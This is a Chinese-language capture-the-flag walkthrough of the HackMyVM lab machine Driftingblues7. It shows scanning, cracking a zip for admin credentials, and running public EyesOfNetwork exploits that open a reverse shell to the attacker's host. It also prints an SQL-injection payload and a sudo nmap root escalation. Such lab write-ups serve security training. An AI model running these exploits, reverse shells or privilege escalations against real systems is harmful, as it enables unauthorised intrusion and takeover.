---
title: Driftingblues7
author: hgbe02
date: 2024-04-13
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Driftingblues7.html"
---

# driftingblues7

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810211.png" alt="image-20240412163839320" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810214.png" alt="image-20240412163937027" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
rustscan -a 172.20.10.6 -- -A
```

```text
Open 172.20.10.6:22
Open 172.20.10.6:66
Open 172.20.10.6:80
Open 172.20.10.6:111
Open 172.20.10.6:443
Open 172.20.10.6:2403
Open 172.20.10.6:3306
Open 172.20.10.6:8086

PORT     STATE SERVICE         REASON  VERSION
22/tcp   open  ssh             syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 c4:fa:e5:5f:88:c1:a1:f0:51:8b:ae:e3:fb:c1:27:72 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzkjX2w5j13avv0y4M6JB6Cz37Ul/T8n3zMamPEhDo+Kvc9tY7uwllHOVigb9rMtwCAffFu0zBGhKY5ph5n1MRkYyS68OLmDGuj2UWzKd3ZY+ETgOw0dx01GiNvV0pd3nJnaPBS+XflsK2uht9NAU9MXfjjXLqL4vtbu7cplFy6BaGFxU0EstzPFQ2zQI8BCmQUUHC21XOVgrUB4xvYs/1XpxRYPvIjGJWzMFKTwXvWC1F0rcMvhk/UpymNjfqWP2TbZnfpgf4xDiEqK+4UEbK9hwFpufkDCNArS6zjJwGRWQsoZewtFy1Yobyu4Tcb/eB3zZziLVDbW+bjxiQiszP
|   256 01:97:8b:bf:ad:ba:5c:78:a7:45:90:a1:0a:63:fc:21 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFPdaFSwiPtfU8tWyo5LipFZ+3VqLP5Bh9vTXTg8F6tbvXw/MxeBDVYT4ixLfX2y+AODzyrGWZdz1Dey2JAwzm0=
|   256 45:28:39:e0:1b:a8:85:e0:c0:b0:fa:1f:00:8c:5e:d1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAjhGjsuyeF1S+XQ0uTCoDgO0RC4kNabc0kxds+gzO4l
66/tcp   open  http            syn-ack SimpleHTTPServer 0.6 (Python 2.7.5)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: SimpleHTTP/0.6 Python/2.7.5
|_http-title: Scalable Cost Effective Cloud Storage for Developers
80/tcp   open  http            syn-ack Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3)
|_http-title: Did not follow redirect to https://172.20.10.6/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3
111/tcp  open  rpcbind         syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  ssl/http        syn-ack Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@localhost/organizationalUnitName=SomeOrganizationalUnit/localityName=SomeCity
| Issuer: commonName=localhost/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@localhost/organizationalUnitName=SomeOrganizationalUnit/localityName=SomeCity
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-03T14:37:22
| Not valid after:  2022-04-03T14:37:22
| MD5:   a0b3:3036:eb25:e23f:3eea:933d:13cd:af6a
| SHA-1: bb62:831f:6882:89bf:dda2:52d6:d95a:6402:adbf:f0e9
| -----BEGIN CERTIFICATE-----
| MIID3jCCAsagAwIBAgICJsgwDQYJKoZIhvcNAQELBQAwgaMxCzAJBgNVBAYTAi0t
| MRIwEAYDVQQIDAlTb21lU3RhdGUxETAPBgNVBAcMCFNvbWVDaXR5MRkwFwYDVQQK
| DBBTb21lT3JnYW5pemF0aW9uMR8wHQYDVQQLDBZTb21lT3JnYW5pemF0aW9uYWxV
| bml0MRIwEAYDVQQDDAlsb2NhbGhvc3QxHTAbBgkqhkiG9w0BCQEWDnJvb3RAbG9j
| YWxob3N0MB4XDTIxMDQwMzE0MzcyMloXDTIyMDQwMzE0MzcyMlowgaMxCzAJBgNV
| BAYTAi0tMRIwEAYDVQQIDAlTb21lU3RhdGUxETAPBgNVBAcMCFNvbWVDaXR5MRkw
| FwYDVQQKDBBTb21lT3JnYW5pemF0aW9uMR8wHQYDVQQLDBZTb21lT3JnYW5pemF0
| aW9uYWxVbml0MRIwEAYDVQQDDAlsb2NhbGhvc3QxHTAbBgkqhkiG9w0BCQEWDnJv
| b3RAbG9jYWxob3N0MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0EtI
| b7FbZ3KGy3/mbivJhLXQR+s9CNK4/z5akN4U1tfAw1djq8vcCOlCxXxAebFQVqeL
| 7Rwo9hvHWDE1rtNcSQ8PgJrIcYGTiNUxFJR5qkOvvB+sbVEsLcpJ6JSg6tIYEUXK
| KLUC5vgB4YtflaxFt1anZ6w6mDPcBGD82D3euO61fAUUDiF336X+rsPG2YsyMC4K
| vUNofnhfnHYh1oZjBB7Bcj9uRn7Dd07mlyWfx2/2ym0idQ2KqGB5akps2V/0u20H
| k0y/S2wFXGfz/zgbldpzzOKdk3aaf102SVWv8zaW1lSM3+/JSx1e7pJVbbdpDcee
| pHq1bnm/zJlSKaVqUwIDAQABoxowGDAJBgNVHRMEAjAAMAsGA1UdDwQEAwIF4DAN
| BgkqhkiG9w0BAQsFAAOCAQEARFSwvH0GEHZeS7kNbP6oTEYTIWBzt0l/V9EUnN44
| ZKNWfIWWzcGAsTuMwO3b7HfHs9RK0mZhNGjZ+voe+uiuhndP4Ao0rwIpLHVLvG1u
| WYGlJ0ZB0Jsf8E3022SXXBhZseMGF5VonFHXXTnR3a+Cu5IjubScEwBg0YvosQE5
| n5Do9pVdm58yuA+YUQfe5OsiR/hGS9Zu76mPlaEJQymUqeFNSt1AVksGf7NIa833
| 5+/8GyqIwLEUZmEZ6Gjg9/yj6Uybe5Ply87PgGPWHdz1luO8wGpL1uXcAlafbaIt
| NgmTYuExR9j0gO7WUz5JB1jn1ansflsAjCo71BxCIwM99A==
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: EyesOfNetwork
|_Requested resource was /login.php##
2403/tcp open  taskmaster2000? syn-ack
3306/tcp open  mysql           syn-ack MariaDB (unauthorized)
8086/tcp open  http            syn-ack InfluxDB http admin 1.7.9
|_http-title: Site doesn't have a title (text/plain; charset=utf-8)
```

### 目录扫描

```bash
gobuster dir -u http://172.20.10.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,git,jpg,txt,png
```

```text
Error: the server returns a status code that matches the provided options for non existing urls. http://172.20.10.6/04926594-380d-4b1f-8247-e871066f63b4 => 302 (Length: 240). To continue please exclude the status code or the length
```

```bash
gobuster dir -u http://172.20.10.6:66/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,git,jpg,txt,png
```

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.20.10.6:66/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              png,php,zip,git,jpg,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/user.txt             (Status: 200) [Size: 32]
/root.txt             (Status: 200) [Size: 32]
/index_files          (Status: 301) [Size: 0] [--> /index_files/]
```

扫着扫着发现出大问题：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810215.png" alt="image-20240412170311181" style="zoom:50%;" />

重启靶机再扫一次，依然扫完端口就关掉了。。。。嘶。。。换一个试试：

```bash
┌──(kali💀kali)-[~/temp/driftingblues7]
└─$ sudo dirsearch -u http://172.20.10.3:66 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 2>/dev/null
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220545
Output File: /home/kali/temp/driftingblues7/reports/http_172.20.10.3_66/_24-04-13_01-25-50.txt
Target: http://172.20.10.3:66/
[01:25:50] Starting: 
[01:25:58] 301 -    0B  - /index_files  ->  /index_files/
[01:32:21] 200 -  248B  - /eon
Task Completed
```

这算互补吗，哈哈哈。

## 漏洞发现

### 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810216.png" alt="image-20240412164301051" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810217.png" alt="image-20240412164314626" style="zoom:50%;" />

### 访问敏感目录

```apl
http://172.20.10.6:66//user.txt
```

```text
AED508ABE3D1D1303E1C1BC5F1C1BA2B
```

```apl
http://172.20.10.6:66/root.txt
```

```text
BD221F968ACB7E069FC7DDE713995C77
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810218.png" alt="image-20240412164850543" style="zoom:33%;" />

```apl
http://172.20.10.6:66/eon
```

```text
UEsDBBQAAQAAAAOfg1LxSVvWHwAAABMAAAAJAAAAY3JlZHMudHh093OsvnCY1d4tLCZqMvRD+ZUU
Rw+5YmOf9bS11scvmFBLAQI/ABQAAQAAAAOfg1LxSVvWHwAAABMAAAAJACQAAAAAAAAAIAAAAAAA
AABjcmVkcy50eHQKACAAAAAAAAEAGABssaU7qijXAYPcazaqKNcBg9xrNqoo1wFQSwUGAAAAAAEA
AQBbAAAARgAAAAAA
```

尝试解密一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810219.png" alt="image-20240412165517903" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810220.png" alt="image-20240412165632934" style="zoom:50%;" />

是一个压缩包。。。。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810221.png" alt="image-20240412170049687" style="zoom:67%;" />

随便找一个在线工具搞一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810222.png" alt="image-20240412170029896" style="zoom:50%;" />

有密码，尝试爆破一下：

```bash
┌──(kali💀kali)-[~/temp/driftingblues7]
└─$ ls -la                                                         
total 12
drwxr-xr-x  2 kali kali 4096 Apr 12 05:05 .
drwxr-xr-x 29 kali kali 4096 Apr 12 04:39 ..
-rw-r--r--  1 kali kali  183 Apr 12 05:05 eon.zip

┌──(kali💀kali)-[~/temp/driftingblues7]
└─$ fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt eon.zip    

PASSWORD FOUND!!!!: pw == killah
```

得到密码！

```bash
┌──(kali💀kali)-[~/temp/driftingblues7]
└─$ unzip eon.zip    
Archive:  eon.zip
[eon.zip] creds.txt password: 
 extracting: creds.txt               

┌──(kali💀kali)-[~/temp/driftingblues7]
└─$ cat creds.txt 
admin
isitreal31__
```

### 登录管理系统

尝试登录：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810223.png" alt="image-20240412170855359" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810224.png" alt="image-20240412170937770" style="zoom: 33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810225.png" alt="image-20240412171118670" style="zoom:50%;" />

### 漏洞利用

尝试搜索一下是否相关漏洞：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810226.png" alt="image-20240412171213734" style="zoom:50%;" />

存在远程代码执行漏洞，尝试利用：

```bash
searchsploit eyesofnetwork
searchsploit -m multiple/webapps/49432.sh
cat 49432.sh
./49432.sh
				 ,*-.
                 |  |
             ,.  |  |
             | |_|  | ,.
             `---.  |_| |
                 |  .--`
                 |  |
                 |  |
Ω
 ! DO NOT USE IF YOU DONT HAVE PERSMISSION !

         EyesOfNetwork 5.3-10

             RedTeam Tool

       Input verification desertion

       RCE via Arbitrary FileUpload


EyesOfNetwork IP :
172.20.10.4
HackerIP (used to start the listener) :
172.20.10.8
Hacker PORT (used to start the listener):
1234
Username (default = admin) :
admin
password :
isitreal31__
getting sessionID ... 
sessionID acquired : 

 When the Reverse-Shell is etablished, you can PrivEsc with : 
echo 'os.execute("/bin/sh")' > /tmp/nmap.script
sudo nmap --script=/tmp/nmap.script
 ... I Know ...  
./listen.sh: 1: gnome-terminal: not found
Sending PostRequest ...
./req.sh: 2: Syntax error: Unterminated quoted string
Get request on the PHP payload ...
clearing cache
```

额这个不行，换一个：

```bash
┌──(kali💀kali)-[~/temp/driftingblues7]
└─$ python3 48025.txt http://172.20.10.4 -ip 172.20.10.8 -port 1234
+-----------------------------------------------------------------------------+
| EyesOfNetwork 5.3 RCE (API v2.4.2)                                          |
| 02/2020 - Clément Billac Twitter: @h4knet                                  |
+-----------------------------------------------------------------------------+

Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 174, in _new_conn
    conn = connection.create_connection(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/urllib3/util/connection.py", line 96, in create_connection
    raise err
  File "/usr/lib/python3/dist-packages/urllib3/util/connection.py", line 86, in create_connection
    sock.connect(sa)
OSError: [Errno 113] No route to host

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 716, in urlopen
    httplib_response = self._make_request(
                       ^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 417, in _make_request
    conn.request(method, url, **httplib_request_kw)
  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 244, in request
    super(HTTPConnection, self).request(method, url, body=body, headers=headers)
  File "/usr/lib/python3.11/http/client.py", line 1298, in request
    self._send_request(method, url, body, headers, encode_chunked)
  File "/usr/lib/python3.11/http/client.py", line 1344, in _send_request
    self.endheaders(body, encode_chunked=encode_chunked)
  File "/usr/lib/python3.11/http/client.py", line 1293, in endheaders
    self._send_output(message_body, encode_chunked=encode_chunked)
  File "/usr/lib/python3.11/http/client.py", line 1052, in _send_output
    self.send(msg)
  File "/usr/lib/python3.11/http/client.py", line 990, in send
    self.connect()
  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 205, in connect
    conn = self._new_conn()
           ^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 186, in _new_conn
    raise NewConnectionError(
urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x7f3a33cd8350>: Failed to establish a new connection: [Errno 113] No route to host

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 486, in send
    resp = conn.urlopen(
           ^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 800, in urlopen
    retries = retries.increment(
              ^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/urllib3/util/retry.py", line 592, in increment
    raise MaxRetryError(_pool, url, error or ResponseError(cause))
urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='172.20.10.4', port=80): Max retries exceeded with url: / (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f3a33cd8350>: Failed to establish a new connection: [Errno 113] No route to host'))

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/kali/temp/driftingblues7/48025.txt", line 89, in <module>
    r = requests.get(baseurl, verify=False, headers={'user-agent':useragent})
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/requests/api.py", line 73, in get
    return request("get", url, params=params, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/requests/api.py", line 59, in request
    return session.request(method=method, url=url, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 589, in request
    resp = self.send(prep, **send_kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 703, in send
    r = adapter.send(request, **kwargs)
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 519, in send
    raise ConnectionError(e, request=request)
requests.exceptions.ConnectionError: HTTPConnectionPool(host='172.20.10.4', port=80): Max retries exceeded with url: / (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f3a33cd8350>: Failed to establish a new connection: [Errno 113] No route to host'))
```

这个也不行，再换一个：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810227.png" alt="image-20240412172248055" style="zoom:33%;" />

尝试一下：

![image-20240412173034823](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810228.png)

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810229.png" alt="image-20240412173044617" style="zoom:50%;" />

然后弹回来了：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810230.png" alt="image-20240412173105370" style="zoom:50%;" />

按照payload说的提权试试：

```bash
(remote) apache@driftingblues.localdomain:/srv/eyesofnetwork/lilac/autodiscovery$ echo 'os.execute("/bin/sh")' > /tmp/nmap.script
(remote) apache@driftingblues.localdomain:/srv/eyesofnetwork/lilac/autodiscovery$ sudo nmap --script=/tmp/nmap.script

Starting Nmap 6.40 ( http://nmap.org ) at 2024-04-12 05:31 EDT
NSE: Warning: Loading '/tmp/nmap.script' -- the recommended file extension is '.nse'.
sh-4.2# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
sh-4.2# find / -perm -u=s -type f 2>/dev/null
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/bin/newgrp
/usr/bin/chage
/usr/bin/sudo
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/crontab
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/chsh
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/pam_timestamp_check
sh-4.2# sudo -l
Matching Defaults entries for root on driftingblues:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
    LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User root may run the following commands on driftingblues:
    (ALL) ALL
sh-4.2# cd root
sh: cd: root: No such file or directory
sh-4.2# cd /root
sh-4.2# ls -la
total 80
dr-xr-x---.  4 root root  4096 Apr  3  2021 .
dr-xr-xr-x. 19 root root  4096 Apr  3  2021 ..
-rw-------.  1 root root   774 Apr  3  2021 .bash_history
-rw-r--r--.  1 root root    18 Dec 28  2013 .bash_logout
-rw-r--r--.  1 root root   176 Dec 28  2013 .bash_profile
-rw-r--r--.  1 root root   176 Dec 28  2013 .bashrc
-rw-r--r--.  1 root root   100 Dec 28  2013 .cshrc
drwxr-----.  3 root root  4096 Apr  3  2021 .pki
-rw-r--r--.  1 root root   129 Dec 28  2013 .tcshrc
-rw-------.  1 root root  1401 Apr  3  2021 anaconda-ks.cfg
-rwxr-xr-x.  1 root root   248 Apr  3  2021 eon
-rw-r--r--   1 root root 17477 Apr  7  2021 index.htm
drwxr-xr-x.  2 root root  4096 Apr  3  2021 index_files
-rw-r--r--   1 root root    32 Apr  7  2021 root.txt
-rwxr-xr-x.  1 root root    52 Apr  3  2021 upit.sh
-rw-r--r--   1 root root    32 Apr  7  2021 user.txt
sh-4.2# cat root.txt 
BD221F968ACB7E069FC7DDE713995C77sh-4.2# cat user.txt 
AED508ABE3D1D1303E1C1BC5F1C1BA2Bsh-4.2# cat upit.sh 
#!/bin/bash

cd /root
python -m SimpleHTTPServer 66
sh-4.2# exit
exit
NSE: failed to initialize the script engine:
/usr/bin/../share/nmap/nse_main.lua:554: /tmp/nmap.script is missing required field: 'action'
stack traceback:
        [C]: in function 'error'
        /usr/bin/../share/nmap/nse_main.lua:554: in function 'new'
        /usr/bin/../share/nmap/nse_main.lua:783: in function 'get_chosen_scripts'
        /usr/bin/../share/nmap/nse_main.lua:1271: in main chunk
        [C]: in ?

QUITTING!
(remote) apache@driftingblues.localdomain:/srv/eyesofnetwork/lilac/autodiscovery$ sudo -l
Matching Defaults entries for apache on driftingblues:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
    LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User apache may run the following commands on driftingblues:
    (root) NOPASSWD: /bin/systemctl * snmptt, /bin/systemctl * snmptrapd, /bin/systemctl * snmpd, /bin/systemctl * nagios, /bin/systemctl * gedd,
        /usr/bin/nmap
```

原来自带了suid的nmap，看一下漏洞时间以及靶机时间：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810231.png" alt="image-20240412173424609" style="zoom: 50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810232.png" alt="image-20240412173453912" style="zoom:50%;" />

坏了，这是之后才发现的漏洞。。。。尝试google一下相关漏洞：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810233.png" alt="image-20240412173751336" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810234.png" alt="image-20240412173829620" style="zoom:50%;" />

这个时间倒是满足要求，下载看一下行不行，和上面发生了一样的报错，看看另一个：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121810235.png" alt="image-20240412174429903" style="zoom:50%;" />

也符合要求，试试，一直报错啊，我才发现靶场ip被我填错了。。。。重新试一下所有的。。

好在之前不行的现在依然不行：

```bash
┌──(kali💀kali)-[~/temp/driftingblues7]
└─$ python3 eonrce.py -h                                                                               
usage: 
+-----------------------------------------------------------------------------+
| EyesOfNetwork 5.3 RCE                                                       |
| 03/2020 - v1.1 - Clément Billac Twitter: @h4knet                            |
|                                                                             |
| Examples:                                                                   |
| eonrce.py -h                                                                |
| eonrce.py http(s)://EyesOfNetwork-URL                                       |
| eonrce.py https://eon.thinc.local -ip 10.11.0.182 -port 3128                |
| eonrce.py https://eon.thinc.local -ip 10.11.0.182 -user pentest2020         |
+-----------------------------------------------------------------------------+
positional arguments:
  URL                 URL of the EyesOfNetwork server

options:
  -h, --help          show this help message and exit
  -ip IP              Local IP to receive reverse shell
  -port Port          Local port to listen
  -user Username      Name of the new user to create
  -password Password  Password of the new user

┌──(kali💀kali)-[~/temp/driftingblues7]
└─$ python3 eonrce.py http://172.20.10.6 -ip 172.20.10.8 -port 1234 -user admin -password isitreal31__
+-----------------------------------------------------------------------------+
| EyesOfNetwork 5.3 RCE                                                       |
| 03/2020 - v1.1 - Clément Billac - Twitter: @h4knet                          |
+-----------------------------------------------------------------------------+
[*] Reverse shell: 172.20.10.8:1234
[*] User to create: admin:isitreal31__
[*] EyesOfNetwork login page found
[*] EyesOfNetwork API page found. API version: 2.4.2
[x] The host seems patched or unexploitable
[!] Did you specified http instead of https in the URL ?
[!] You can check manually the SQLi with the following payload: /eonapi/getApiKey?username=' union select sleep(3),0,0,0,0,0,0,0 or '

┌──(kali💀kali)-[~/temp/driftingblues7]
└─$ python3 eonrce2.py -h                                                                             
usage: 
+-----------------------------------------------------------------------------+
| EyesOfNetwork 5.1 to 5.3 RCE exploit                                        |
| 03/2020 - v1.0 - Clément Billac - Twitter: @h4knet                          |
|                                                                             |
| Examples:                                                                   |
| eonrce.py -h                                                                |
| eonrce.py http(s)://EyesOfNetwork-URL                                       |
| eonrce.py https://eon.thinc.local -ip 10.11.0.182 -port 3128                |
+-----------------------------------------------------------------------------+
positional arguments:
  URL           URL of the EyesOfNetwork server

options:
  -h, --help    show this help message and exit
  -ip IP        Local IP to receive reverse shell
  -port Port    Local port to listen
  -sleep Sleep  SQL Sleep value

┌──(kali💀kali)-[~/temp/driftingblues7]
└─$ python3 eonrce2.py http://172.20.10.6 -ip 172.20.10.8 -port 1234
+-----------------------------------------------------------------------------+
| EyesOfNetwork 5.1 to 5.3 RCE exploit                                        |
| 03/2020 - v1.0 - Clément Billac - Twitter: @h4knet                        |
+-----------------------------------------------------------------------------+

[*] EyesOfNetwork login page found
[+] Application seems vulnerable. Time: 1.006418
[*] The admin user has at least one session opened
[*] Found the admin session_id size: 29
[+] Obtained admin session ID: 358748692
[x] Error while creating the discovery job
```

不知道啥情况，有的师傅用这个脚本出来的，但是我没有成功，尝试那个msf脚本，那个时间也对的上的！

```bash
┌──(kali💀kali)-[~/temp/driftingblues7]
└─$ msfconsole
Metasploit tip: Use the resource command to run commands from a file
                                                  
               .;lxO0KXXXK0Oxl:.
           ,o0WMMMMMMMMMMMMMMMMMMKd,
        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
 oMMMMMMMMMMx.                    dMMMMMMMMMMx
.WMMMMMMMMM:                       :MMMMMMMMMM,
xMMMMMMMMMo                         lMMMMMMMMMO
NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
xMMMMMMMMMd                        ,0MMMMMMMMMMK;
.WMMMMMMMMMc                         'OMMMMMM0,
 lMMMMMMMMMMk.                         .kMMO'
  dMMMMMMMMMMWd'                         ..
   cWMMMMMMMMMMMNxc'.                ##########
    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
      ;0MMMMMMMMMMMMMMMo.          +:+
        .dNMMMMMMMMMMMMo          +#++:++#+
           'oOWMMMMMMMMo                +:+
               .,cdkO0K;        :+:    :+:                                
                                :::::::+:
                      Metasploit

       =[ metasploit v6.3.55-dev                          ]
+ -- --=[ 2397 exploits - 1235 auxiliary - 422 post       ]
+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search eyesofnetwork

Matching Modules
================

   #  Name                                                Disclosure Date  Rank       Check  Description
   -  ----                                                ---------------  ----       -----  -----------
   0  exploit/linux/http/eyesofnetwork_autodiscovery_rce  2020-02-06       excellent  Yes    EyesOfNetwork 5.1-5.3 AutoDiscovery Target Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/eyesofnetwork_autodiscovery_rce

msf6 > use 0
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/eyesofnetwork_autodiscovery_rce) > show options;
[-] Invalid parameter "options;", use "show -h" for more information
msf6 exploit(linux/http/eyesofnetwork_autodiscovery_rce) > show options

Module options (exploit/linux/http/eyesofnetwork_autodiscovery_rce):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
